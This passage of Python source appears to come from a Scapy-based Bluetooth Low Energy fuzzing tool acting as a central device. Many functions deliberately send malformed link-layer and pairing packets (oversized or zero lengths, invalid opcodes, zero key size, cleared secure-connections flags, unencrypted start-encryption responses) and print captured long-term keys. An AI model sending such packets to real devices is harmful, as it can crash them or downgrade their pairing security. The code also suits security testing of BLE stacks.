                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Failed" in pkt.summary():
                    pkt.show()
                    print("received SM_Failed")
                    self.client_socket.send("sm_failed\n")
                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Security_Request" in pkt.summary():
                    pkt.show()
                    print("received SM_Security_Request")
                    self.client_socket.send("sec_req\n")
                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Encryption_Information" in pkt.summary():
                    print("received SM_Encryption_Information")
                    pkt.show()
                    self.conn_ltk = pkt.ltk
                    print(Fore.GREEN + "[!] LTK received from OTA: " + hexlify(self.conn_ltk).upper())
                    self.finish_keys()
                if "BTLE / BTLE_DATA / L2CAP_Hdr / SM_Hdr / SM_Master_Identification" in pkt.summary():
                    print("received SM_Master_Identification")
                    pkt.show()
                    self.conn_ediv = pkt.ediv
                    self.conn_rand = pkt.rand
                    self.finish_keys()
                if "BTLE / BTLE_DATA / CtrlPDU / LL_UNKNOWN_RSP" in pkt.summary():
                    print("received unknown response")
                    self.client_socket.send("unknown_resp\n")

        if print_lines:
            print('----------------------------')
            return 1

    def version_already_received(self):
        if self.slave_ble_version is not None:
            return True
        return False

    def send_pri_services_response(self):
        self.att.read_by_group_type_resp(0x0000, "", None)

    def send_scan_request(self):

#         self.master_address_type = 0
#         self.slave_address_type = 0

        if self.master_address_type is None or self.slave_address_type is None:
            self.load_addr_type()

        self.conn_encryted = False
        pkt = BTLE() / BTLE_ADV(RxAdd=self.slave_address_type, TxAdd=self.master_address_type) / BTLE_SCAN_REQ(
            ScanA=self.master_address,
            AdvA=self.slave_address)
        print('Master Type: ' + str(self.master_address_type))
        print('Slave Type: ' + str(self.slave_address_type))
        print('Master: ' + str(self.master_address))
        print('Slave: ' + str(self.slave_address))
        # pkt.Length = 14
        # pkt.Length = 6
        # pkt.AdvA = '7f:4d:e5:00:00:00'
        # pkt.ScanA = '00:00:00:00:21:09'
        # pkt.PDU_type = 0x0d
        self.send(pkt)

        print(Fore.YELLOW + 'Waiting advertisements from ' + self.slave_address)
        #self.driver.set_jamming(1)

    def receive_scan_response(self):
        if self.pkt_received:

            if (BTLE_ADV_NONCONN_IND in self.pkt or BTLE_ADV_IND in self.pkt or BTLE_SCAN_RSP in self.pkt) and \
                    self.pkt.AdvA == self.slave_address.lower():
                self.machine.reset_state_timeout()

                # self.disable_timeout('scan_timeout_timer')
                # self.start_timeout('scan_timeout_timer', self.scan_timeout, self.scan_timeout_detected)

                if BTLE_ADV_IND in self.pkt and self.slave_address_type != self.pkt.TxAdd:
                    self.slave_address_type = self.pkt.TxAdd  # Get slave address type
                    self.send_scan_request()  # Send scan request again
                else:
                    self.slave_address_type = self.pkt.TxAdd
                    return True

                return True
        return False

    switch = 0

    def send_connection_request(self):
        self.slave_feature_set = None
        self.slave_ble_version = None


        pkt = BTLE() / BTLE_ADV(RxAdd=self.slave_address_type, TxAdd=self.master_address_type) / BTLE_CONNECT_REQ(
            InitA=self.master_address,
            AdvA=self.slave_address,
            AA=self.conn_access_address,
            crc_init=0x179a9c,
            win_size=self.conn_window_size,
            win_offset=self.conn_window_offset,
            interval=self.conn_interval,  # 36
            latency=self.conn_slave_latency,
            timeout=self.conn_timeout,
            chM=self.conn_channel_map,
            hop=5,
            SCA=0,
        )

        self.conn_access_address = pkt.AA

        if self.slave_device:
            del self.slave_device
        self.slave_device = BLEDevice()

        self.send(pkt)

    
    def send_connection_request_custom(self, interval, timeout, ll_length, channel_map, hop):
        self.slave_feature_set = None
        self.slave_ble_version = None

        pkt = BTLE() / BTLE_ADV(RxAdd=self.slave_address_type, TxAdd=self.master_address_type) / BTLE_CONNECT_REQ(
            InitA=self.master_address,
            AdvA=self.slave_address,
            AA=self.conn_access_address,
            crc_init=0x179a9c,
            win_size=self.conn_window_size,
            win_offset=self.conn_window_offset,
            interval=self.conn_interval,  # 36
            latency=self.conn_slave_latency,
            timeout=self.conn_timeout,
            chM=self.conn_channel_map,
            hop=5,
            SCA=0,
        )

        self.conn_access_address = pkt.AA
        
        if self.slave_device:
            del self.slave_device
        self.slave_device = BLEDevice()

        if ll_length == 1:
            pkt[BTLE_ADV].Length = 247
        if interval == 1:
            pkt[BTLE_ADV].interval = 0
        if timeout == 1:
            pkt[BTLE_ADV].timeout = 0
        if channel_map == 1:
            pkt[BTLE_CONNECT_REQ].chM = 0x00
        elif channel_map == 2:
            pkt[BTLE_CONNECT_REQ].chM = 0xffff
        if hop == 1:
            pkt[BTLE_CONNECT_REQ].hop = 0
        self.send(pkt)

    
    def send_gatt_response(self):
        if self.last_gatt_request is None:
            pkt = self.pkt
            self.last_gatt_request = pkt
        else:
            pkt = self.last_gatt_request

        self.att.marshall_request(None, pkt[ATT_Hdr], self.peer_address)
        # self.sent_packet.show()

    def receive_gatt_request(self):
        if ATT_Hdr in self.pkt:
            return True
        return False

    def handle_gatt_response(self):
        if ATT_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            self.last_gatt_request = self.pkt
            self.att.marshall_request(None, self.pkt[ATT_Hdr], self.peer_address)
            self.last_gatt_request = None
            if ATT_Error_Response in self.sent_packet:
                # self.last_gatt_request = None
                return False
        return False

    def receive_empty_pdu(self):
        if BTLE_DATA in self.pkt and self.pkt[BTLE_DATA].len == 0:
            return True
        return False

    def receive_2_empty_pdu(self):
        if BTLE_DATA in self.pkt and self.pkt[BTLE_DATA].len == 0:
            self.empty_pdu_count += 1
            if self.empty_pdu_count >= 3:
                self.empty_pdu_count = 0
                return True
        return False

    def send_feature_request(self):
        self.master_feature_set = 'le_encryption+le_data_len_ext'
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
            feature_set=self.master_feature_set)

        self.send(pkt)
        # self.send_encryption_request()
        # self.send_feature_request()

    def receive_feature_request(self):
        print("Packet Summary: " + self.pkt.summary() + " " + str(self.pkt_received))
        if self.pkt_received:
            if LL_SLAVE_FEATURE_REQ in self.pkt:
                print("I reached in receive_feature_req")
                self.slave_feature_set = self.pkt.feature_set
                print(Fore.GREEN + "[!] Slave features: " + str(self.slave_feature_set))
                return True
        return False

    def send_feature_response(self):
        self.master_feature_set = 'le_encryption+le_data_len_ext'
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
            feature_set=self.master_feature_set)

        self.send(pkt)

    def send_feature_response_feature_set_zero(self):
        self.master_feature_set = ''
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
            feature_set=self.master_feature_set)

        self.send(pkt)

    def receive_feature_response(self):
        if self.pkt_received:
            if LL_FEATURE_RSP in self.pkt:
                self.slave_feature_set = self.pkt.feature_set
                print(Fore.GREEN + "[!] Slave features: " + str(self.slave_feature_set))
                return True
        return False

    def send_length_request(self):
 
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
            max_tx_bytes=self.master_mtu + 4, max_rx_bytes=self.master_mtu + 4)
        self.send(pkt)

        
    def send_length_request_custom(self,ll_length, tx_rx, txrx_time):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
            max_tx_bytes=self.master_mtu + 4, max_rx_bytes=self.master_mtu + 4)
        
        if ll_length == 1:
            pkt.len = 247
           
        if ll_length == 2:
            pkt.len = 1
            
        if tx_rx == 1:
            pkt.max_tx_bytes = 1
            pkt.max_rx_bytes = 0
            
        if txrx_time == 1:
            pkt.max_tx_time = 0
            pkt.max_rx_time = 0
            
        self.send(pkt)
        
    

    def receive_length_request(self):
        if self.pkt_received:
            if LL_LENGTH_REQ in self.pkt:
                return True
        return False

    def send_length_response(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
            max_tx_bytes=self.att.mtu + 4, max_rx_bytes=self.att.mtu + 4)

        self.send(pkt)

    def send_length_response_zero_rx_tx(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
            max_tx_bytes=0, max_rx_bytes=0)

        self.send(pkt)
    
    def send_length_response_zero_time(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
            max_tx_bytes=self.att.mtu + 4, max_rx_bytes=self.att.mtu + 4, max_rx_time=0, max_tx_time=0)

        self.send(pkt)

    def receive_length_response(self):
        if LL_UNKNOWN_RSP in self.pkt:
            return True
        if LL_LENGTH_RSP in self.pkt:
            return True

        return False

    def send_version_indication(self):
        # Using BLE version 4.2
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')

        self.send(pkt)
        # self.send_encryption_request()
    
    
    def send_version_indication_custom(self, ll_length, llid, replay, op):
        # Using BLE version 4.2
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
        if ll_length == 1:
            pkt.len = 247
        elif ll_length == 2:
            pkt.len = 1
        if llid == 1:
            pkt.LLID = 0
        if op == 1:
            pkt[CtrlPDU].optcode = 0xf0

        self.send(pkt)

    def receive_version_indication(self):

        if self.pkt_received:
            #if LL_SLAVE_FEATURE_REQ in self.pkt:
                #self.send_feature_response()

            if LL_VERSION_IND in self.pkt:
                self.slave_ble_version = self.pkt[LL_VERSION_IND].version

                if BTLE_Versions.has_key(self.slave_ble_version):
                    print(Fore.GREEN + "[!] Slave BLE Version: " + str(
                        BTLE_Versions[self.slave_ble_version]) + " - " + hex(self.slave_ble_version))
                else:
                    print(Fore.RED + "[!] Unknown Slave BLE Version: " + hex(self.slave_ble_version))
                self.version_received = True
                return True
        return False

    def receive_security_request(self):
        if SM_Security_Request in self.pkt:
            # self.paring_auth_request = self.pkt[SM_Security_Request].authentication
            # self.pairing_iocap = 0x04  # Change device to Keyboard an Display
            # self.send_encryption_request()
            # self.send_feature_request()
            return True

    def send_security_request(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / \
              SM_Security_Request(authentication=self.paring_auth_request)
        self.send(pkt)

    def send_mtu_length_request(self):
        # self.raw_att(ATT_Exchange_MTU_Response(self.att.mtu), None, None)
        pkt = BTLE(access_addr=self.conn_access_address) / \
              BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=self.att.mtu)

        print("packet length: " + str(pkt.len))
        self.send(pkt)

    def send_mtu_length_request_custom(self, ll_length, llid):
        # self.raw_att(ATT_Exchange_MTU_Response(self.att.mtu), None, None)
        pkt = BTLE(access_addr=self.conn_access_address) / \
              BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=self.att.mtu)
        print("packet length: " + str(pkt.len))
        if ll_length == 1:
            pkt.len = 247
        elif ll_length == 2:
            pkt.len = 1
        elif ll_length == 5:
            pkt.len = 5
        if llid == 1:
            pkt[BTLE_DATA].LLID = 0            


        self.send(pkt)

    def receive_mtu_length_request(self):
        if self.pkt_received:
            if ATT_Exchange_MTU_Request in self.pkt:
                # self.att.set_mtu(self.pkt.mtu)
                return True
        return False


    def send_mtu_length_response(self):
        print("sending mtu length response before!")
        if self.pkt is None or saved_pkt_with_ATT_Hdr is None:
            return
        #if ATT_Hdr in self.pkt:
            #print("sending mtu length response  with self pkt header!")
            #self.att.marshall_request(None, self.pkt[ATT_Hdr], self.peer_address)
        #elif ATT_Hdr in saved_pkt_with_ATT_Hdr:
            #print("sending mtu length response with saved pkt header")
            #self.att.marshall_request(None, saved_pkt_with_ATT_Hdr[ATT_Hdr], self.peer_address)
        #else:
            #print("Do nothing in mtu_length_response")

    def send_mtu_length_response_llid_zero(self):
        print("sending mtu length response before!")
        if self.pkt is None or saved_pkt_with_ATT_Hdr is None:
            return
        if ATT_Hdr in self.pkt and self.pkt[BTLE_DATA] is not None and self.pkt[BTLE_DATA].LLID is not None:
            print("sending mtu length response  with self pkt header!")
            self.pkt[BTLE_DATA].LLID = 0
            self.att.marshall_request(None, self.pkt[ATT_Hdr], self.peer_address)
        elif ATT_Hdr in saved_pkt_with_ATT_Hdr and saved_pkt_with_ATT_Hdr[BTLE_DATA] is not None and saved_pkt_with_ATT_Hdr[BTLE_DATA].LLID is not None:
            print("sending mtu length response with saved pkt header")
            saved_pkt_with_ATT_Hdr[BTLE_DATA].LLID = 0
            self.att.marshall_request(None, saved_pkt_with_ATT_Hdr[ATT_Hdr], self.peer_address)
        else:
            print("Do nothing in send_mtu_length_response_llid_zero")

    def send_mtu_length_response_mtu_zero(self):
        print("sending mtu length response before!")
        if self.pkt is None or saved_pkt_with_ATT_Hdr is None:
            return
        if ATT_Hdr in self.pkt and self.pkt[ATT_Exchange_MTU_Request] is not None and self.pkt[ATT_Exchange_MTU_Request].mtu is not None:
            print("sending mtu length response  with self pkt header!")
            self.pkt[BTLE_DATA].mtu = 0
            self.att.marshall_request(None, self.pkt[ATT_Hdr], self.peer_address)
        elif ATT_Hdr in saved_pkt_with_ATT_Hdr and saved_pkt_with_ATT_Hdr[ATT_Exchange_MTU_Request] is not None and saved_pkt_with_ATT_Hdr[ATT_Exchange_MTU_Request].mtu is not None:
            print("sending mtu length response with saved pkt header")
            saved_pkt_with_ATT_Hdr[BTLE_DATA].mtu = 0
            self.att.marshall_request(None, saved_pkt_with_ATT_Hdr[ATT_Hdr], self.peer_address)
        else:
            print("Do nothing in send_mtu_length_response_mtu_zero")

    def receive_mtu_length_response(self):
        if LL_LENGTH_REQ in self.pkt:
            # TODO: Handle 2cap fragmentation if length is less than mtu
            # By responding to length request from slave here, length will be registered by slave
            self.send_length_response()
        if ATT_Exchange_MTU_Response in self.pkt:
            self.att.set_mtu(self.pkt.mtu)
            return True


    def send_pair_request_keyboard_display(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        # paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
        self.pairing_iocap = 0x04


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]

                print("Pairing Request packet")
                pkt.show()
                self.send(pkt)
                # self.send(pkt)
                # self.send_encryption_request()
                # self.v = 0
        else:
            self.send(self.sent_packet)

    def send_pair_request_display_yes_no(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        # paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
        self.pairing_iocap = 0x01


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                print("Pairing Request packet")
                pkt.show()
                self.send(pkt)
                # self.send(pkt)
                # self.send_encryption_request()
                # self.v = 0
        else:
            self.send(self.sent_packet)
            
    def send_pair_request(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        # paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
        self.pairing_iocap = 0x03
 
        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                print("Pairing Request packet")
                pkt.show()
                self.send(pkt)
                # self.send(pkt)
                # self.send_encryption_request()
                # self.v = 0
        else:
            self.send(self.sent_packet)
            
    def send_pair_request_oob(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        # paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
        self.pairing_iocap = 0x03


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                pkt[SM_Pairing_Request].oob = 1

                print("Pairing Request packet")
                pkt.show()
                self.send(pkt)
                # self.send(pkt)
                # self.send_encryption_request()
                # self.v = 0
        else:
            self.send(self.sent_packet)


    def send_pair_request_no_sc(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        self.paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.pairing_iocap = 0x03


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                if SM_Pairing_Request in pkt:
                    #pkt[SM_Pairing_Request].authentication = 0x08 | 0x40 | 0x01
                    pkt[SM_Pairing_Request].authentication &= 0xF7  # Clear secure connections flag

                    print("Pairing Request packet")
                    pkt.show()
                    self.send(pkt)
                    # self.send(pkt)
                    # self.send_encryption_request()
                    # self.v = 0
        else:
            self.send(self.sent_packet)


    def send_pair_request_no_sc_keyboard_display(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        self.paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.pairing_iocap = 0x04


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]

                if SM_Pairing_Request in pkt:
                    #pkt[SM_Pairing_Request].authentication = 0x08 | 0x40 | 0x01
                    pkt[SM_Pairing_Request].authentication &= 0xF7  # Clear secure connections flag

                    print("Pairing Request packet")
                    pkt.show()
                    self.send(pkt)
                    # self.send(pkt)
                    # self.send_encryption_request()
                    # self.v = 0
        else:
            self.send(self.sent_packet)




    def send_pair_request_no_sc_display_yes_no(self):
        # paring_auth_request = 0x00  # No bonding
        # paring_auth_request = 0x01  # Bonding
        # paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
        self.paring_auth_request = 0x04 | 0x01  # MITM + bonding
        self.pairing_iocap = 0x01


        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                if SM_Pairing_Request in pkt:
                    #pkt[SM_Pairing_Request].authentication = 0x08 | 0x40 | 0x01
                    pkt[SM_Pairing_Request].authentication &= 0xF7  # Clear secure connections flag
                    print("Pairing Request packet")
                    pkt.show()
                    self.send(pkt)
                    # self.send(pkt)
                    # self.send_encryption_request()
                    # self.v = 0
        else:
            self.send(self.sent_packet)
            
    def send_pair_request_no_sc_bonding(self):

        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]

                if SM_Pairing_Request in pkt:
                    pkt[SM_Pairing_Request].authentication &= 0xF6  # Clear secure connections flag + bonding
                    print("Pairing Request packet")
                    pkt.show()
                    self.send(pkt)
                    # self.send(pkt)
                    # self.send_encryption_request()
                    # self.v = 0
        else:
            self.send(self.sent_packet)
            
    

    def send_pair_request_custom(self, oob, no_sc, key, llid, key_disp, yes_no, auth, init_key):

        if no_sc == 1:
            self.paring_auth_request = 0x04 | 0x01  # MITM + bonding
        else:
            self.paring_auth_request = 0x08 | 0x04 | 0x01  # MITM + bonding
            
        if auth == 1:
            self.paring_auth_request = 0x00
        elif auth == 2:
           self.paring_auth_request == 0x08
        elif auth == 3:
            self.paring_auth_request |= 0x03
            
            
        if key_disp == 1:
            self.pairing_iocap = 0x04
        else:
            self.pairing_iocap = 0x03    
        
        if yes_no == 1:
            self.pairing_iocap = 0x01
       
        
        if not self.pairing_starting:
            BLESMPServer.configure_connection(self.master_address_raw, self.slave_address_raw,
                                              self.slave_address_type,
                                              self.pairing_iocap, self.paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]

                if SM_Pairing_Request in pkt:
                    if no_sc == 1:
                        pkt[SM_Pairing_Request].authentication &= 0xF7  # Clear secure connections flag + bonding
                    if llid == 1:
                        pkt.LLID = 0
                    if key == 1:
                        pkt[SM_Pairing_Request].max_key_size = 0  
                    elif key == 2:
                        pkt[SM_Pairing_Request].max_key_size = 254
                    
                    if init_key == 1:
                        pkt[SM_Pairing_Request].initiator_key_distribution = 0x00
                        pkt[SM_Pairing_Request].responder_key_distribution = 0x00
                    elif init_key == 2:
                        pkt[SM_Pairing_Request].initiator_key_distribution = 0x07
                 
                    if oob == 1:
                        pkt[SM_Pairing_Request].oob = 1  

                    print("Pairing Request packet")
                    pkt.show()
                    self.send(pkt)
        else:
            self.send(self.sent_packet)
    
    


    def finish_pair_response(self):

        # if SM_Public_Key in self.pkt:
        #     pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Confirm()
        #     self.send(pkt)
        #     pass
        print("In finish_pair_response")
        
        # handling error in ble_central
        if self.pkt is None:
            return

        if SM_Hdr in self.pkt:
            self.pkt.show()
            self.machine.reset_state_timeout()

            try:
                smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / self.pkt[SM_Hdr]))
            except:
                return False
            if smp_answer is not None and isinstance(smp_answer, list):
                for res in smp_answer:
                    print("value of res:")
                    res = HCI_Hdr(res)  # type: HCI_Hdr
                    res.show()
                    if SM_Hdr in res:
                        print("SM_Hdr")
                        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
                        pkt.show()
                        self.pairing_starting = True


                    elif HCI_Cmd_LE_Start_Encryption_Request in res:
                        self.conn_ltk = res.ltk
                        self.conn_ediv = res.ediv
                        print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).upper())
                        return True

        return False
    
    
    
    def finish_keys(self):

        # if SM_Public_Key in self.pkt:
        #     pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Confirm()
        #     self.send(pkt)
        #     pass
        print("In finish_pair_response")
        
        # handling error in ble_central
        if self.pkt is None:
            return

        if SM_Hdr in self.pkt:
            self.pkt.show()
            self.machine.reset_state_timeout()


            try:
                smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / self.pkt[SM_Hdr]))
            except:
                return False
            if smp_answer is not None and isinstance(smp_answer, list):
                for res in smp_answer:
                    print("value of res:")
                    res = HCI_Hdr(res)  # type: HCI_Hdr
                    res.show()
                    if SM_Hdr in res:
                        print("SM_Hdr")
                        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
                        pkt.show()
                        self.pairing_starting = True

                
                        self.send(pkt)

                        # sleep(0.9)
                        # if SM_Public_Key in pkt:
                        #     self.send_encryption_request()

                    elif HCI_Cmd_LE_Start_Encryption_Request in res:
                        self.conn_ltk = res.ltk
                        self.conn_ediv = res.ediv
                        print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).upper())
                        return True

        return False

    def send_encryption_request(self):
        print("in send_encryption_request")
        # if self.conn_encryted is False:
        self.conn_ediv = '\x00'  # this is 0 on first time pairing
        self.conn_rand = '\x00'  # this is 0 on first time pairing
        self.conn_iv = '\x00' * 4  # set IVm (IV of master)
        self.conn_skd = '\x00' * 8
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=self.conn_ediv,
                                                                                                rand=self.conn_rand,
                                                                                                skdm=self.conn_skd,
                                                                                                ivm=self.conn_iv)
  
        pkt.show()

        self.send(pkt)
    
    def send_encryption_request_custom(self, edivrand, op):
        print("in send_encryption_request")
        # if self.conn_encryted is False:
       
        self.conn_iv = '\x00' * 4  # set IVm (IV of master)
        self.conn_skd = '\x00' * 8
        # self.conn_iv = os.urandom(4)  # set IVm (IV of master)
        # self.conn_skd = os.urandom(8)
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=self.conn_ediv,
                                                                                                rand=self.conn_rand,
                                                                                                skdm=self.conn_skd,
                                                                                                ivm=self.conn_iv)
        if edivrand == 1:
            self.conn_ediv = '\x01'  # this is 0 on first time pairing
            self.conn_rand = '\x01'  # this is 0 on first time pairing
        else:
            self.conn_ediv = '\x00'
            self.conn_rand = '\x00'
        if op == 1:
            pkt[CtrlPDU].optcode = 0x33
        pkt.show()
        self.send(pkt)
    
    def send_encryption_request_op(self):
        print("in send_encryption_request")
        # if self.conn_encryted is False:
        self.conn_ediv = '\x01'  # this is 0 on first time pairing
        self.conn_rand = '\x01'  # this is 0 on first time pairing
        self.conn_iv = '\x00' * 4  # set IVm (IV of master)
        self.conn_skd = '\x00' * 8
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv=self.conn_ediv,
                                                                                                rand=self.conn_rand,
                                                                                                skdm=self.conn_skd,
                                                                                                ivm=self.conn_iv)
        # pkt[BTLE_DATA].LLID = 0
        
        pkt.show()

        self.send(pkt)
        


    def send_start_encryption_response(self):
        global scan_response_received
        print("value of scan_response_received: "+str(scan_response_received))
        self.conn_encryted = True  # Enable encryption for tx/rx
        if scan_response_received:
            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
            pkt.show()
            self.send(pkt)
        else:
            self.conn_encryted = False


    def send_start_encryption_response_plain(self):
        saved = self.conn_encryted
        self.conn_encryted = False  # Enable encryption for tx/rx
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
        pkt.show()
        self.send(pkt)
        self.conn_encryted = saved

    def send_encryption_pause_request(self):
        global scan_response_received
        print("value of scan_response_received: "+str(scan_response_received))
        self.conn_encryted = True  # Enable encryption for tx/rx
        if scan_response_received:
            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_PAUSE_ENC_REQ()
            pkt.show()
            self.send(pkt)
        else:
            self.conn_encryted = False

    def send_encryption_pause_request_plain(self):
        saved = self.conn_encryted
        self.conn_encryted = False
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_PAUSE_ENC_REQ()
        pkt.show()
        self.send(pkt)
        self.conn_encryted = saved

    def send_encryption_pause_response(self):
        global scan_response_received
        print("value of scan_response_received: "+str(scan_response_received))
        self.conn_encryted = True  # Enable encryption for tx/rx
        if scan_response_received:
            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_PAUSE_ENC_RSP()
            pkt.show()
            self.send(pkt)
        else:
            self.conn_encryted = False


    def send_encryption_pause_response_plain(self):
        saved = self.conn_encryted
        self.conn_encryted = False  # Enable encryption for tx/rx
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_PAUSE_ENC_RSP()
        pkt.show()
        self.send(pkt)
        self.conn_encryted = saved

    def receive_encryption_response(self):

        self.pkt.show()
        if LL_ENC_RSP in self.pkt:
            #if self.conn_skd or self.conn_iv is None:
                #return
            
